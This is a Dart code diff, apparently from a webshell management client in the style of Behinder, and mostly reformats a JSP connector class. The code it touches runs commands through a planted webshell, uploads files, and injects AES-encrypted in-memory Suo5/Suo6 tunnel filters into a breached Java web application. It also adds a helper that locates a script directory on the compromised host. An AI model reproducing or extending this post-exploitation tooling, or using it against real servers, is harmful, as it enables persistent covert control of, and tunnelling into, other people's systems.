@@ -12,6 +12,7 @@ import 'package:http/http.dart' as http;
 import '../core/crypto/behinder_crypto.dart';
 import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
+import 'jsp_webapp_path.dart';
 import 'shell_connector.dart';
 import 'shell_exec_connector.dart';
 
@@ -277,8 +278,7 @@ class JspBehinderConnector extends ShellConnector {
     } else {
       cd = '';
     }
-    final script =
-        '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}';
+    final script = '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}';
     final xv = _execScriptForXvHeader(script);
     final r = await _sendBehinder(
       'exec',
@@ -293,6 +293,14 @@ class JspBehinderConnector extends ShellConnector {
     if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
     return currentDir;
   }
+
+  @override
+  Future<String?> getShellScriptDir() => JspWebappPath.resolveJspAgentShellScriptDir(
+        supportsShellExec: supportsShellExec,
+        shellUrl: webshell.url,
+        loadSysinfo: getSystemInfo,
+        exec: executeCommand,
+      );
 
   /// Shell command that lists [path] in the same pipe-delimited format the
   /// behinder `ls` action uses: `base64(name)|d_or_f|size|perms|mtime\n`.
@@ -504,9 +512,11 @@ class JspBehinderConnector extends ShellConnector {
       onProgress(math.min(blockSize, total), total);
     }
 
-    for (var batchStart = 1;
-        batchStart < blockCount;
-        batchStart += _kWpartParallelism) {
+    for (
+      var batchStart = 1;
+      batchStart < blockCount;
+      batchStart += _kWpartParallelism
+    ) {
       final batchEnd = math.min(batchStart + _kWpartParallelism, blockCount);
       final futures = <Future<bool>>[];
       for (var bi = batchStart; bi < batchEnd; bi++) {
@@ -678,10 +688,14 @@ class JspBehinderConnector extends ShellConnector {
 
       String b64;
       try {
-        b64 = (await io.File('data/mem_shell/Suo5FilterInject.b64').readAsString()).trim();
+        b64 = (await io.File(
+          'data/mem_shell/Suo5FilterInject.b64',
+        ).readAsString()).trim();
       } catch (_) {
         try {
-          b64 = (await rootBundle.loadString('data/mem_shell/Suo5FilterInject.b64')).trim();
+          b64 = (await rootBundle.loadString(
+            'data/mem_shell/Suo5FilterInject.b64',
+          )).trim();
         } catch (_) {
           return '[Error] Suo5FilterInject.b64 未找到，请重新构建资产';
         }
@@ -690,9 +704,9 @@ class JspBehinderConnector extends ShellConnector {
       if (b64.isEmpty) return '[Error] Suo5FilterInject.b64 为空';
 
       final payloadBytes = Uint8List.fromList(base64.decode(b64));
-      final b64Payload = _aesEncryptBase64(payloadBytes)
-          .replaceAll('\n', '')
-          .replaceAll('\r', '');
+      final b64Payload = _aesEncryptBase64(
+        payloadBytes,
+      ).replaceAll('\n', '').replaceAll('\r', '');
       final bodyBytes = utf8.encode(b64Payload);
 
       final uri = Uri.parse(webshell.url);
@@ -705,8 +719,9 @@ class JspBehinderConnector extends ShellConnector {
         'X-S5-Path': urlPath,
       };
       if (_cookies.isNotEmpty) {
-        headers['Cookie'] =
-            _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+        headers['Cookie'] = _cookies.entries
+            .map((e) => '${e.key}=${e.value}')
+            .join('; ');
       }
 
       final response = await _client
@@ -737,10 +752,14 @@ class JspBehinderConnector extends ShellConnector {
 
       String b64;
       try {
-        b64 = (await io.File('data/mem_shell/Suo6FilterInject.b64').readAsString()).trim();
+        b64 = (await io.File(
+          'data/mem_shell/Suo6FilterInject.b64',
+        ).readAsString()).trim();
       } catch (_) {
         try {
-          b64 = (await rootBundle.loadString('data/mem_shell/Suo6FilterInject.b64')).trim();
+          b64 = (await rootBundle.loadString(
+            'data/mem_shell/Suo6FilterInject.b64',
+          )).trim();
         } catch (_) {
           return '[Error] Suo6FilterInject.b64 未找到，请重新构建资产';
         }
@@ -749,9 +768,9 @@ class JspBehinderConnector extends ShellConnector {
       if (b64.isEmpty) return '[Error] Suo6FilterInject.b64 为空';
 
       final payloadBytes = Uint8List.fromList(base64.decode(b64));
-      final b64Payload = _aesEncryptBase64(payloadBytes)
-          .replaceAll('\n', '')
-          .replaceAll('\r', '');
+      final b64Payload = _aesEncryptBase64(
+        payloadBytes,
+      ).replaceAll('\n', '').replaceAll('\r', '');
       final bodyBytes = utf8.encode(b64Payload);
 
       final uri = Uri.parse(webshell.url);
@@ -764,8 +783,9 @@ class JspBehinderConnector extends ShellConnector {
         'X-S6-Path': urlPath,
       };
       if (_cookies.isNotEmpty) {
-        headers['Cookie'] =
-            _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+        headers['Cookie'] = _cookies.entries
+            .map((e) => '${e.key}=${e.value}')
+            .join('; ');
       }
 
       final response = await _client
